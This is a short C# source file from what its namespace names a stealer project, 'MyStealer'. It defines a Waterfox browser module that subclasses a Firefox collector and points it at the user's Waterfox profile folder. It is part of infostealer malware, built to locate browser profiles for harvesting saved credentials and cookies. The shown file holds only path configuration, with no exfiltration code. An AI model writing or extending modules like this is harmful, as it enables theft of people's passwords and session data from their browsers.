using System;
using System.IO;

namespace MyStealer.Collector.Browser.FirefoxBased
{
    public class WaterFox : Firefox
    {
        public override string ModuleName => "Waterfox";

        protected override string ProfilesPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WaterFox", "Profiles");

        public override string[] LibDirectory => new string[] { "Waterfox" };
    }
}
